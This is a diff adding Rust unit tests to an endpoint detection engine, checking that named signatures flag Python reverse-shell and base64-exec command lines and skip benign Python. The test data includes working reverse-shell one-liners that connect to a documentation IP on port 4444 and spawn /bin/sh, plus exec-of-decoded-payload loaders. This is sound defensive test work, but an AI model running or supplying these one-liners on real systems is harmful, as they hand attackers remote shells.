@@ -1543,6 +1543,59 @@ rule eguard_custom_dir_test {
             assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_some());
         }
     }
+    #[test]
+    fn detp1_python_context_without_payload_has_no_named_signature() {
+        let mut engine = detection::DetectionEngine::default_with_rules();
+        super::seed_string_signatures(&mut engine);
+        for command in [
+            "python3 -c 'import json,sys;print(json.load(sys.stdin))'",
+            "python3 -c 'import base64;print(base64.b64encode(b\"x\"))'",
+            "base64 -d file",
+            "python3 -c 'import base64;print(base64.b64decode(payload))'",
+            "python3 -c 'exec(payload)'",
+            "python3 -c 'import socket;s=socket.socket();s.connect((\"198.51.100.7\",4444))'",
+            "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.7\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'",
+        ] {
+            let mut event = base_event();
+            event.command_line = Some(command.into());
+            let hit = engine.layer1.check_event(&event);
+            assert!(hit.matched_signatures.is_empty(), "{command}");
+        }
+    }
+
+    #[test]
+    fn detp1_python_socket_stdio_variants_have_named_signature() {
+        let engine = detection::DetectionEngine::default_with_rules();
+        for command in [
+            "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"198.51.100.10\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+        ] {
+            let mut event = base_event();
+            event.command_line = Some(command.into());
+            let hit = engine.layer1.check_event(&event);
+            assert!(hit.matched_signatures.iter().any(|name| name == "python_socket_stdio_reverse_shell"), "{command}");
+        }
+    }
+
+    #[test]
+    fn detp1_python_exec_base64_variants_have_named_signature() {
+        let engine = detection::DetectionEngine::default_with_rules();
+        for command in [
+            "python3 -c 'import base64;exec(base64.b64decode(payload))'",
+            "python3 -c \"exec(__import__('base64').b64decode(payload))\"",
+        ] {
+            let mut event = base_event();
+            event.command_line = Some(command.into());
+            let hit = engine.layer1.check_event(&event);
+            assert!(
+                hit.matched_signatures
+                    .iter()
+                    .any(|name| name == "python_exec_base64_payload"),
+                "{command}"
+            );
+        }
+    }
+
     fn detp1_fixture_event(
         pid: u32,
         ppid: u32,
